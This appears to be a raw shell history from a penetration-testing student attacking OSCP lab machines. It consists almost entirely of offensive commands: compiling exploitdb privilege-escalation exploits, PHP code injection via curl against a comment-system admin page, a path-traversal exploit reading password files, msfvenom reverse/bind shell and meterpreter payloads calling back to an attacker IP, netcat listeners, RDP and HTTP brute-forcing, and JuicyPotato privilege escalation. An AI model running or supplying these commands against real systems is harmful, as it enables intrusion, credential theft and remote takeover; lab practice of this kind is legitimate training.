  441  2020-08-21 06:15  sudo apt install libx11-dev:i386 libx11-dev
  442  2020-08-21 06:16  apt-get install gcc-multilib\n
  443  2020-08-21 06:16  sudo apt-get install gcc-multilib\n
  444  2020-08-21 06:16  sudo apt-get install libc6-dev:i386\n
  445  2020-08-21 06:16  sudo apt update && upgrade#
  446  2020-08-21 06:17  git commit -m "got the rshell on .8"
  447  2020-08-21 06:34  sudo apt update && upgrade
  448  2020-08-21 06:51  gcc -m32 -o output32  /usr/share/exploitdb/exploits/linux_x86/local/9542.c 
  449  2020-08-21 06:53  sudo apt --fix-broken install
  450  2020-08-21 06:53  sudo apt install gcc-multilib\n
  451  2020-08-21 06:56  CC="gcc -m32" CXX="g++ -m32" LDFLAGS=-m32\n
  452  2020-08-21 06:57  gcc -Wall CC="gcc -m32" CXX="g++ -m32" LDFLAGS=-m32 -mtune=i686 /usr/share/exploitdb/exploits/linux_x86/local/9542.c -o lol
  453  2020-08-21 06:57  searchspolit centos 2.6
  454  2020-08-21 06:58  searchsploit 9545.c
  455  2020-08-21 06:58  locate linux/local/9545.c
  456  2020-08-21 06:58  gcc -Wall -m32 -mtune=i686 /usr/share/exploitdb/exploits/linux/local/9545.c
  457  2020-08-21 06:59  gcc -Wall -m32 -mtune=i686 /usr/share/exploitdb/exploits/linux_x86/local/9542.c 
  458  2020-08-21 07:01  gcc /usr/share/exploitdb/exploits/linux_x86/local/9542.c -o priv
  459  2020-08-21 07:02  gcc -m32 -Wl, --hash-style=both   /usr/share/exploitdb/exploits/linux_x86/local/9542.c -o lol
  460  2020-08-21 07:02  gcc -m32 -Wl --hash-style=both   /usr/share/exploitdb/exploits/linux_x86/local/9542.c -o lol
  461  2020-08-21 07:03  cd /usr/share/exploitdb/exploits/linux_x86/local
  462  2020-08-21 07:05  sudo apt-get install libtesseract-dev\n\n
  463  2020-08-21 07:06  python3 -m pip install lsassy\n
  464  2020-08-21 07:09  apt-get install gcc-9-base libgcc-9-dev libc6-dev\n
  465  2020-08-21 07:09  sudo apt-get install gcc-9-base libgcc-9-dev libc6-dev\n
  466  2020-08-21 07:10  sudo apt-get install gcc-multilib g++-multilib\n\n
  467  2020-08-21 07:15  gcc -m32 -Wl,--hash-style=both 9542.c -o 9542\n
  468  2020-08-21 07:16  sudo gcc -m32 -Wl,--hash-style=both 9542.c -o 9542\n
  469  2020-08-21 07:28  mv 9542 ~/OSCP/8/tmp
  470  2020-08-21 07:28  sudo mv 9542 ~/OSCP/8/tmp
  471  2020-08-21 07:29  whomai
  472  2020-08-21 07:37  cat 10.11.1.8tcpports
  473  2020-08-21 07:43  mysql -u root -p\n
  474  2020-08-21 07:46  mysql –host=127.0.01 --port=3306
  475  2020-08-21 07:47  mysql -h 127.0.0.1 -P 3306 -u root -p <database>\n
  476  2020-08-21 07:54  curl  --data "<?system(' config.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  477  2020-08-21 07:54  curl  --data "<?system(' cat config.php');?>" "http://10.11.1.8/internal/advanced_comment_system/admin.php?ACS_path=php://input%00"
  478  2020-08-21 08:05  git push -u master
  479  2020-08-21 09:52  git commit -m "found database stuff"
  480  2020-08-21 22:21  nikto -h  http://10.11.1.8/
  481  2020-08-21 22:25  mkdir 9
  482  2020-08-21 22:25  rf -rf 9
  483  2020-08-21 22:25  rm -rf 9
  484  2020-08-21 22:26  mkdir 10
  485  2020-08-21 22:27  auto
  486  2020-08-21 22:27  autorecon    
  487  2020-08-21 22:27  autorecon  -h 10.11.1.10
  488  2020-08-21 22:27  autorecon  10.11.1.10
  489  2020-08-21 23:02  mv results 
  490  2020-08-21 23:02  mv results 10
  491  2020-08-21 23:02  cd 1q
  492  2020-08-21 23:02  cd report/q
  493  2020-08-21 23:04  vim _full_tcp_nmap.xml
  494  2020-08-21 23:05  ./tcp_80_http_
  495  2020-08-21 23:05  ./tcp_80_http_screenshot.png
  496  2020-08-21 23:13  sudo nmap -Pn -n -oN ./nmapscan 10.11.1.8\n
  497  2020-08-21 23:15  gobuster dir -u http://10.11.1.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -k -x txt,php
  498  2020-08-21 23:16  lgobuster dir -u http://10.11.1.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
  499  2020-08-21 23:45  vim -q_quick_tcp_nmap.txt
  500  2020-08-21 23:45  vim nmapscan
  501  2020-08-22 00:04  cd xml
  502  2020-08-22 00:10  vim tcp_80_http_robots.txt
  503  2020-08-22 01:43  cat exploit
  504  2020-08-22 01:43  cat exploit/*
  505  2020-08-22 01:43  cat exploit/
  506  2020-08-22 01:45  gobuster -u http://10.11.1.10:80/ -t 16 -r -e txt,html,php,asp,aspx,jsp -f -w /usr/share/seclists/Discovery/Web-Content/big.txt --plain-text-report="/home/kali/OSCP/results/10.11.1.10/scans/tcp_80_http_dirsearch_big.txt"\n
  507  2020-08-22 01:46  touch tcp_80_http_gobuster_big.txt
  508  2020-08-22 01:46  $         gobuster dir -u http://10.11.1.10:80/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "/home/kali/OSCP/results/10.11.1.10/scans/tcp_80_http_gobuster_big.txt"\n
  509  2020-08-22 02:01  cat /home/kali/OSCP/results/10.11.1.10/scans/tcp_80_http_gobuster_big.txt
  510  2020-08-22 02:01  touch  /home/kali/OSCP/results/10.11.1.10/scans/tcp_80_http_gobuster_big.txt
  511  2020-08-22 02:15  vim tcp_80_http_gobuster_big.txt
  512  2020-08-22 02:15  rm tcp_80_http_gobuster_big.txt
  513  2020-08-22 02:15  $         gobuster dir -u http://10.11.1.10:80/ -w /usr/share/seclists/Discovery/Web-Content/big.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z\n
  514  2020-08-22 02:37  sudo s-s
  515  2020-08-22 02:43  ced 10
  516  2020-08-22 02:44  i pa
  517  2020-08-22 03:12  gobuster dir -u http://10.11.1.10/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 
  518  2020-08-22 03:12  d 10
  519  2020-08-22 03:19  cd 120
  520  2020-08-22 03:19  lcd 10.11.1.10
  521  2020-08-22 03:19  vim tcp_80_http_whatweb.txt
  522  2020-08-22 03:29  -x "txt,html,php,asp,aspx,jsp"
  523  2020-08-22 03:29  gobuster dir -u http://10.11.1.10:80/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp"
  524  2020-08-22 03:30  gobuster -z
  525  2020-08-22 03:32  curl http://10.11.1.10/index.jsp
  526  2020-08-22 03:35  curl http://10.11.1.10:80/out.txt
  527  2020-08-22 05:20  dirb http://10.11.1.10:80/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" -o "/home/kali/OSCP/results/10.11.1.10/scans/tcp_80_http_dirb_dirbuster.txt"\n
  528  2020-08-22 05:20  dirb http://10.11.1.10:80/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -r -S -X ",.txt,.html,.php,.asp,.aspx,.jsp" \n
  529  2020-08-22 05:20  drib
  530  2020-08-22 05:21  dirb http://10.11.1.10:80/ /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -l -r  -X ",.txt,.html,.php,.asp,.aspx,.jsp" 
  531  2020-08-22 05:22  vim _errors.log 
  532  2020-08-22 05:22  vmi _patterns.log 
  533  2020-08-22 05:24  curl http://10.11.1.10/cfide/
  534  2020-08-22 05:25  vim tcp_80_http_nikto.txt
  535  2020-08-22 05:26  vim tcp_80_http_nmap.txt
  536  2020-08-22 05:27  locate 14641
  537  2020-08-22 05:27  vim /usr/share/exploitdb/exploits/multiple/remote/14641.py
  538  2020-08-22 05:28  ls- al /usr/share/exploitdb/exploits/multiple/remote/14641.py
  539  2020-08-22 05:28  ls -al /usr/share/exploitdb/exploits/multiple/remote/14641.py
  540  2020-08-22 05:28  ./ /usr/share/exploitdb/exploits/multiple/remote/14641.py
  541  2020-08-22 05:28  cd  /usr/share/exploitdb/exploits/multiple/remote/
  542  2020-08-22 05:29  14641
  543  2020-08-22 05:29  grep 14641
  544  2020-08-22 05:29  grep ./ 14641
  545  2020-08-22 05:29  grep 14641.py
  546  2020-08-22 05:29  grep ./ 14641.py
  547  2020-08-22 05:30  ./14641.py
  548  2020-08-22 05:30  ./14641.py 2134234
  549  2020-08-22 05:31  vim 14641.py
  550  2020-08-22 05:31  python 14641.py
  551  2020-08-22 05:31  python 14641.py http://10.11.1.10/ 80 
  552  2020-08-22 05:32  python 14641.py http://10.11.1.10/ 80 ../../../../../../../lib/password.properties\n
  553  2020-08-22 05:33  python 14641.py http://10.11.1.10/ \n
  554  2020-08-22 05:34  python 14641.py http://10.11.1.10/ ../s\n
  555  2020-08-22 05:36  10.11.1.10.ctb\n
  556  2020-08-22 05:36  cherrytree 10.11.1.10.ctb\n
  557  2020-08-22 05:37  dirb http://10.11.1.10:80/ /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt  -l -r  -X ",.txt,.html,.php,.asp,.aspx,.jsp" 
  558  2020-08-22 05:42  vim tcp_80_http_gobuster.txt
  559  2020-08-22 05:56  hash-identifier
  560  2020-08-22 06:04  #msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.14.10 LPORT=443 -f raw > shell.jsp
  561  2020-08-22 06:05  #msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.217 PORT=443 -f raw > shell.jsp
  562  2020-08-22 06:05  cat nmapscan
  563  2020-08-22 06:05  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.217 PORT=443 -f raw > shell.jsp
  564  2020-08-22 06:08  python -m SimpleHTTPServer 80
  565  2020-08-22 06:23  mv shell.jsp ../exploit
  566  2020-08-22 06:28  L
  567  2020-08-22 06:42  d exploit
  568  2020-08-22 06:43  rm shell.jsp
  569  2020-08-22 06:50  vim shell.jsp
  570  2020-08-22 07:15  msfvenom -p java/jsp_shell_reverse_tcp LHOST=192.168.119.217 LPORT=443 -f raw > shell.jsp
  571  2020-08-22 07:21  rm 10.11.1.10.ctb\~\~\~ 10.11.1.10.ctb\~\~ 
  572  2020-08-22 07:21  mv 10.11.1.10.ctb report
  573  2020-08-22 07:21  cat a416a831fddf36aa8c01ba0674ca7bf8 >> proof.txt
  574  2020-08-22 07:22  git commit -m "got .10"
  575  2020-08-22 21:45  mkdir 13
  576  2020-08-22 23:49  nmap -Pn --script vuln 10.11.1.8\n
  577  2020-08-22 23:50  sudo nmap -Pn -n -oN ./ 10.11.1.13\n
  578  2020-08-22 23:50  sudo nmap -Pn -n -oN 10.11.1.13\n
  579  2020-08-22 23:50  sudo nmap -Pn -n -oN quicknmap 10.11.1.13\n
  580  2020-08-22 23:51  vim 10.11.1.13
  581  2020-08-22 23:51  vim enum4linux.txt
  582  2020-08-22 23:51  vim _errors.log
  583  2020-08-23 00:13  vim _full_tcp_nmap.txt
  584  2020-08-23 00:20  vim _patterns.log
  585  2020-08-23 00:25  vim _quick_tcp_nmap.txt
  586  2020-08-23 00:27  vim smbclient.txt
  587  2020-08-23 00:28  vim smbmap-execute-command.txt
  588  2020-08-23 00:28  vim ^[[200~smbmap-list-contents.txt~
  589  2020-08-23 00:28  vim smbmap-list-contents.txt~
  590  2020-08-23 00:28  vim smbmap-list-contents.txt
  591  2020-08-23 00:29  cat ^[[200~tcp_135_rpc_nmap.txt~
  592  2020-08-23 00:29  vim tcp_139_smb_nmap.txt
  593  2020-08-23 00:34  vim tcp_21_ftp_hydra.txt
  594  2020-08-23 00:55  git commit -m "started .13 foundft plog in"
  595  2020-08-23 09:25  cd oSCP
  596  2020-08-23 09:25  autorecon  10.11.1.13\n
  597  2020-08-23 09:26  autorecon  10.11.1.14\n\n
  598  2020-08-23 09:51  vim tcp_135_rpc_nmap.txt
  599  2020-08-23 09:52  vim tcp_21_ftp_nmap.txt
  600  2020-08-23 09:53  medusa -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e ns -n 3389 -O /home/kali/OSCP/13/results/10.11.1.13/scans/tcp_3389_rdp_medusa.txt -M rdp -h 10.11.1.13
  601  2020-08-23 09:54  vim tcp_3389_rdp_medusa.txt
  602  2020-08-23 09:54  medusa -U /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P /usr/share/seclists/Passwords/darkweb2017-top100.txt -e ns -n 3389 -O /home/kali/OSCP/13/results/10.11.1.13/scans/tcp_3389_rdp_medusa.txt -M rdp -h 10.11.1.13\n
  603  2020-08-23 09:54  vim tcp_3389_rdp_nmap.txt
  604  2020-08-23 09:55  vim tcp_3389_sslscan.txt
  605  2020-08-23 09:56  vim tcp_4167_http_gobuster.txt
  606  2020-08-23 09:59  cat tcp_4167_http_nmap.txt
  607  2020-08-23 09:59  cat tcp_4167_http_robots.txt
  608  2020-08-23 10:05  cat tcp_4167_http_whatweb.txt
  609  2020-08-23 10:06  cat tcp_49152_rpc_nmap.txt
  610  2020-08-23 10:07  tcp_49154_rpc_nmap.txt
  611  2020-08-23 10:07  cat tcp_49154_rpc_nmap.txt
  612  2020-08-23 10:07  cat tcp_49156_rpc_nmap.txt
  613  2020-08-23 10:07  cat tcp_49158_rpc_nmap.txt
  614  2020-08-23 10:07  cat tcp_5800_http_gobuster.txt
  615  2020-08-23 10:07  cat tcp_5800_http_index.html
  616  2020-08-23 10:08  + The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
  617  2020-08-23 10:08  cat tcp_5800_http_nmap.txt
  618  2020-08-23 10:09  cat tcp_5800_http_whatweb.txt
  619  2020-08-23 10:13  msf 
  620  2020-08-23 10:50  cd eres
  621  2020-08-23 10:58  date --help\n
  622  2020-08-23 11:06  curl http://10.11.1.13:4167/
  623  2020-08-23 11:12  echo 04-07-19  10:25PM       <DIR>          aspnet_client\n04-07-19  07:14PM                99710 iis-85.png\n04-07-19  07:14PM                  701 iisstart.htm\n08-23-20  12:59AM               347648 JuicyPotato.exe\n08-23-20  12:59AM                59392 nc.exe\n08-23-20  12:58AM                 3419 shell-x64.aspx\n>> notes.txt
  624  2020-08-23 11:13  git commit -m "the ftp server dir is set up on the port, cna probs execute files from there"
  625  2020-08-23 18:53  searchsploit shell_reverse_tcp windows x64
  626  2020-08-23 18:53  searchsploit shell_reverse_tcp windows 
  627  2020-08-23 18:53  searchsploit reverse windows 
  628  2020-08-23 18:56  msfvenom -a x64  --platform Windows
  629  2020-08-23 18:58  msfvenom -p
  630  2020-08-23 18:58  msfvenom -p --list-options
  631  2020-08-23 19:08  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=443 -e x86/shikata_ga_nai -b '\x00' -f asp -o a.aspx\n
  632  2020-08-23 19:14  vim a.aspx
  633  2020-08-23 19:14  rm a.asp
  634  2020-08-23 19:16  msfvenom --list --formats
  635  2020-08-23 19:16  msfvenom  --formats
  636  2020-08-23 19:17  msfvenom -list formats
  637  2020-08-23 19:18  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=443 -e x86/shikata_ga_nai -b '\x00' -f asp -o shell64.aspx-exe
  638  2020-08-23 19:23  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=443 -e x86/shikata_ga_nai -b '\x00' -f asp -o shell64.exe
  639  2020-08-23 19:25  lsftp
  640  2020-08-23 19:27  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=443 -e x86/shikata_ga_nai -b '\x00' -f aspx -o rshell.aspx
  641  2020-08-23 19:29  vim quicknmap
  642  2020-08-23 19:30  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=49152 -e x86/shikata_ga_nai -b '\x00' -f aspx -o rshellp.aspx
  643  2020-08-23 19:30  sudo nc -nvlp 49152
  644  2020-08-23 19:37  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=49152 -e x86/shikata_ga_nai -b '\x00' -f exe -o rshellp.exe
  645  2020-08-23 19:40  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=443 -e x86/shikata_ga_nai -b '\x00' -f exe -o rshell.exe
  646  2020-08-23 19:42  locate aspnet_client
  647  2020-08-23 19:42  locate / | grepaspnet_client
  648  2020-08-23 19:42  locate / | grep aspnet_client
  649  2020-08-23 19:43  locate iisstart.htm
  650  2020-08-23 19:43  locate / | grep iisstart.htm
  651  2020-08-23 19:53  sudo locate / | grep iisstart.htm
  652  2020-08-23 19:58  msfvenom --help
  653  2020-08-23 19:59  msfvenom --list encoders
  654  2020-08-23 20:06  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=4444 -e x64/xor_dynamic   -b '\x00' -f aspx -o rshell.aspx
  655  2020-08-23 20:14  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=5985 -e x64/xor_dynamic   -b '\x00' -f aspx -o rshell.aspx
  656  2020-08-23 20:18  sudo nc -nvlp 5985 
  657  2020-08-23 20:31  msfvenom --list formats
  658  2020-08-23 20:31  msfvenom -a x64 --platform Windows -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=5985 -e x64/xor_dynamic   -b '\x00' -f aspx-exe -o rshell.aspx-exe
  659  2020-08-23 20:41  cd one of the same
  660  2020-08-23 20:45  cd results/10.11.1.13/scans
  661  2020-08-23 20:45  msfvenom  -p  windows/x64/shell/bind_tcp lhost=192.168.119.217 lport=5985 -e x64/xor_dynamic   -b '\x00' -f exe -o rshell.exe
  662  2020-08-23 21:43  mv meterpreter.aspx ../exploit
  663  2020-08-23 22:14  cd down
  664  2020-08-24 01:20  grep exe
  665  2020-08-24 06:36  mv JuicyPotato.exe ../OSCP/13/results/10.11.1.13/exploit
  666  2020-08-24 06:36  cd OSCP/13/results/10.11.1.13/exploit \n
  667  2020-08-24 06:36  cd ~/OSCP/13/results/10.11.1.13/exploit \n
  668  2020-08-24 10:53  cd 10.11.1.14/scans
  669  2020-08-24 11:10  zip AccessChk.zip
  670  2020-08-24 11:10  zip
  671  2020-08-24 11:11  unzip
  672  2020-08-24 11:11  unzip AccessChk.zip
  673  2020-08-24 19:42  mv accesschk64.exe accesschk /home/kali/OSCP/13/results/10.11.1.13/exploit
  674  2020-08-24 19:42  mv accesschk64.exe accesschk.exe /home/kali/OSCP/13/results/10.11.1.13/exploit
  675  2020-08-24 19:43  cd /home/kali/OSCP/13/results/10.11.1.13/exploit
  676  2020-08-24 19:51  locate / | grep ms16_075_rel
  677  2020-08-24 19:51  find / | grep ms16_075_rel
  678  2020-08-24 20:52  cd ~/OSCP/13/results/10.11.1.13/exploit
  679  2020-08-24 21:46  mv ~/Downloads/winPEASx64.exe ./
  680  2020-08-24 21:47  mv winPEASx64.exe ../exploit
  681  2020-08-24 21:52  ftp 
  682  2020-08-24 22:17  sudo nc -nvlp 4321
  683  2020-08-24 22:33  sudo nc -nvlp 1337
  684  2020-08-24 22:54  uzip  juicy-potato-0.1.zip
  685  2020-08-24 22:54  unzip  juicy-potato-0.1.zip
  686  2020-08-24 22:55  rm pwk-82638-723655\(1\).pdf
  687  2020-08-24 22:55  vim readme.txt
  688  2020-08-24 22:55  rm readme.txt
  689  2020-08-24 22:55  rm juicy-potato-0.1.zip
  690  2020-08-24 22:55  rm AccessChk.zip
  691  2020-08-24 22:55  rm go1.15.linux-amd64.tar.gz
  692  2020-08-24 22:55  rm netcat-win32-1.12.zip
  693  2020-08-24 23:58  cd OSCP/13/results/10.11.1.13/exploit
  694  2020-08-24 23:59  impacket-smbserver test /home/kali/OSCP/13/results/10.11.1.13/exploit/winPEASx64.exe
  695  2020-08-24 23:59  sudo impacket-smbserver test /home/kali/OSCP/13/results/10.11.1.13/exploit/winPEASx64.exe
  696  2020-08-25 01:02  rm JuicyPotato\(1\).exe
  697  2020-08-25 01:02  cd Docs
  698  2020-08-25 01:02  cd CLSID
  699  2020-08-25 01:11  rm JuicyPotato\(1\).exe 
  700  2020-08-25 01:12  fole
  701  2020-08-25 01:12  file
  702  2020-08-25 01:12  iptable
  703  2020-08-25 01:12  service iptable
  704  2020-08-25 01:12  sudo service iptable
  705  2020-08-25 01:12  sudo service iptables
  706  2020-08-25 01:13  cd juicy-potato-0.1
  707  2020-08-25 01:16  kali at kali in ~/Downloads/juicy-potato-0.1 
  708  2020-08-25 01:16  $ cd JuicyPotato
  709  2020-08-25 01:23  sudo impacket-smbserver test /home/kali/OSCP/13/results/10.11.1.13/exploit/
  710  2020-08-25 01:28  sudo impacket-smbserver test /home/kali/Downloads
  711  2020-08-25 01:29  sudo nc -nvlp 1340
  712  2020-08-25 02:06  git commit -m "fuck 13"
  713  2020-08-25 03:41  rm juicy-potato-0.1 
  714  2020-08-25 03:41  rm -rf juicy-potato-0.1 
  715  2020-08-25 03:41  rm -rf JuicyPotato\(1\).exe JuicyPotato.exe 
  716  2020-08-25 04:32  cd 13/results/10.11.1.13/exploit
  717  2020-08-25 04:33  ftp 10.11.1.13
  718  2020-08-25 04:47  ip amsfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=4444  -f aspx -o meterpreter.aspx
  719  2020-08-25 04:53  cd 13/results/10.11.1.13/report
  720  2020-08-25 05:12  1;2c
  721  2020-08-25 05:21  awkl
  722  2020-08-25 05:21  awk
  723  2020-08-25 05:21  awk tcp
  724  2020-08-25 05:24  tcp_3389_rdp_medusa.txt
  725  2020-08-25 05:24  cat tcp_3389_rdp_medusa.txt
  726  2020-08-25 05:24  tcp_21_ftp_hydra.txt
  727  2020-08-25 06:26  git commit -m "finished .13 report"
  728  2020-08-25 06:31  autorecon  10.11.1.20\n
  729  2020-08-25 06:32  cat _errors.log
  730  2020-08-25 10:33  curl http://10.11.1.14:80
  731  2020-08-25 10:34  gobuster dir -u https://10.11.1.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "/home/kali/OSCP/results/10.11.1.14/scans/tcp_443_https_gobuster_dirbuster.txt" 
  732  2020-08-25 10:34  gobuster dir -u http://10.11.1.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" -z -o "/home/kali/OSCP/results/10.11.1.14/scans/tcp_443_https_gobuster_dirbuster.txt" a
  733  2020-08-25 10:35  gobuster dir -u http://10.11.1.14 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -e -k -l -s "200,204,301,302,307,403,500" -x "txt,html,php,asp,aspx,jsp" 
  734  2020-08-25 10:35  curl http://10.11.1.14/
  735  2020-08-25 10:36  tcp_443_http_nmap.txt
  736  2020-08-25 10:37  cat tcp_443_https_gobuster_dirbuster.txt
  737  2020-08-25 10:37  cat tcp_443_https_index.html
  738  2020-08-25 10:37  cat tcp_443_https_robots.txt
  739  2020-08-25 10:37  cat tcp_443_https_whatweb.txt
  740  2020-08-25 10:39  cd 10.11.1.14 
  741  2020-08-25 10:40  git clone Server: Microsoft-IIS/5.1\n
  742  2020-08-25 10:40  git clone https://411hall.github.io/assets/files/CTF_template.ctb
  743  2020-08-25 10:40  git clone https://github.com/unmeg/hax/blob/master/BOX-SKELETON.ctb
  744  2020-08-25 10:41  rm CTF_template\(1\).ctb
  745  2020-08-25 10:41  cp CTF_template.ctb ~/OSCP/results/10.11.1.14/report
  746  2020-08-25 10:51  nmap -sC -sV 10.11.1.14
  747  2020-08-25 19:11  cat cat _manual_commands.txt
  748  2020-08-25 19:22  hydra -L "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e nsr -s 80 -o "/home/kali/OSCP/results/10.11.1.14/scans/tcp_443_https_auth_hydra.txt" http-get://10.11.1.14/printers
  749  2020-08-25 19:35  cat tcp_80_http_auth_medusa.txt
  750  2020-08-25 19:38  #msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=4444  -f aspx -o meterpreter.aspx
  751  2020-08-25 19:38  msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=4444  -f aspx -o meterpreter.aspx
  752  2020-08-25 19:42  vim  screenshots
  753  2020-08-25 19:43  rm meterpreter.aspx
  754  2020-08-25 19:43  msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=4444  -f asp -o meterpreter.asp
  755  2020-08-25 19:45  vim meterpreter.asp
  756  2020-08-25 19:45  rm meterpreter.asp
  757  2020-08-25 19:45  msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=4444  -f asp -o meterpreterx64.asp
  758  2020-08-25 19:46  searchsploit \t\nIIS 5.1
  759  2020-08-25 19:47  msfvenom  -p  windows/x64/meterpreter/reverse_tcp  lhost=192.168.119.217 lport=4444  -f asp -o meterpreterx64.aspu
  760  2020-08-25 19:47  locate / | grep windows/x64/meterpreter
  761  2020-08-25 19:49  locate windows/x64/meterpreter/reverse_tcp \n
  762  2020-08-25 19:49  find windows/x64/meterpreter/reverse_tcp 
  763  2020-08-25 19:49  find / | grep windows/x64/meterpreter/reverse_tcp 
  764  2020-08-25 19:50  msfvenom --list payloads to list
  765  2020-08-25 19:51  msfvenom  -p --list
  766  2020-08-25 19:51  msfvenmon
  767  2020-08-25 19:52  msfvenom --payload --list
  768  2020-08-25 19:52  msfvenom --payload --list payloads
  769  2020-08-25 19:53  msfvenom  --list payloads
  770  2020-08-25 19:58  msfvenom  -p  windows/shell/reverse_tcp  lhost=192.168.119.217 lport=4444  -f asp -o rshell.asp
  771  2020-08-25 19:59  sudo msfconsole 
  772  2020-08-25 20:16  cd 10.11.1.13/exploit
  773  2020-08-25 20:17  mv ../../../../results/10.11.1.14/exploit
  774  2020-08-25 20:17  mv accesschk.exe ../../../../results/10.11.1.14/exploit
  775  2020-08-25 20:17  cd ../../../../results/10.11.1.14/exploit
  776  2020-08-25 20:22  sudo impacket-smbserver test /OSCP/results/10.11.1.14/exploit
  777  2020-08-25 20:25  sudo impacket-smbserver test ~/OSCP/results/10.11.1.14/exploit
  778  2020-08-25 21:27  mv Accesschk.zip%0D ~/OSCP/results/10.11.1.14/exploit
  779  2020-08-25 21:27  cd ~/OSCP/results/10.11.1.14/exploit
  780  2020-08-25 21:27  rm accesschk.
  781  2020-08-25 21:27  rm accesschk.exe
  782  2020-08-25 21:28  unzip Accesschk.zip%0D
  783  2020-08-25 21:28  rm Accesschk.zip%0D
  784  2020-08-25 21:28  vim Eula.txt
  785  2020-08-25 21:29  rm Eula.txt
  786  2020-08-25 21:35  cc results
  787  2020-08-25 21:44  cd 10.11.1.14/l
  788  2020-08-25 21:45  msfconsole 
  789  2020-08-25 21:52  cd results/10.11.1.13/exploit
  790  2020-08-25 21:52  mv nc.exe ~/OSCP/results/10.11.1.14/exploit
  791  2020-08-25 21:52  cd ~/OSCP/results/10.11.1.14
  792  2020-08-25 21:52  ftp 10.11.1.14
  793  2020-08-25 22:12  cd results/10.11.1.14
  794  2020-08-25 22:26  sudo nc -nvlp 1234
  795  2020-08-25 22:27  rm CTF_template.ctb\~ CTF_template.ctb\~\~ CTF_template.ctb\~\~\~
  796  2020-08-25 22:28  cd Microsoft-IIS
  797  2020-08-25 22:30  git commit -m "got box 14"
  798  2020-08-25 23:00  autorecon  10.11.1.23
  799  2020-08-25 23:00  autorecon  10.11.1.24
  800  2020-08-26 00:19  medusa -U "/usr/share/seclists/Usernames/top-usernames-shortlist.txt" -P "/usr/share/seclists/Passwords/darkweb2017-top100.txt" -e ns -n 3389 -O "/home/kali/OSCP/results/10.11.1.22/scans/tcp_3389_rdp_medusa.txt" -M rdp -h 10.11.1.22\n
  801  2020-08-26 00:50  cat tcp_3389_rdp_hydra.txt
  802  2020-08-26 00:51  cat tcp_49667_rpc_nmap.txt
  803  2020-08-26 00:51  cat tcp_49668_rpc_nmap.txt
  804  2020-08-26 00:51  cat tcp_49669_rpc_nmap.txt
  805  2020-08-26 00:52  cat tcp_49670_rpc_nmap.txt
  806  2020-08-26 00:52  cat tcp_49671_rpc_nmap.txt
  807  2020-08-26 00:52  cat                 rpcclient -p 135 -U "" 10.11.1.22\n
  808  2020-08-26 03:15  cat _manual_commands.txt 
  809  2020-08-26 04:43  cat tcp_5985_http_gobuster_dirbuster.txt
  810  2020-08-26 04:49  vim tcp_5985_http_gobuster_dirbuster.txt
  811  2020-08-26 04:54  cat 10.11.1.5ports
  812  2020-08-26 04:57  msfconsole
  813  2020-08-26 05:07  cat tcp_1337_ssh_nmap.txt
  814  2020-08-26 05:23  curl  --data "<?system('ls');?>" "http://10.11.1.31/postinfo.html"
  815  2020-08-26 05:23  curl
  816  2020-08-26 05:23  curl --help
  817  2020-08-26 05:25  cur lhttp://10.11.1.31/_vti_inf.html
  818  2020-08-26 05:25  curl http://10.11.1.31/_vti_inf.html
  819  2020-08-26 05:26  curl http://10.11.1.31/postinfo.html
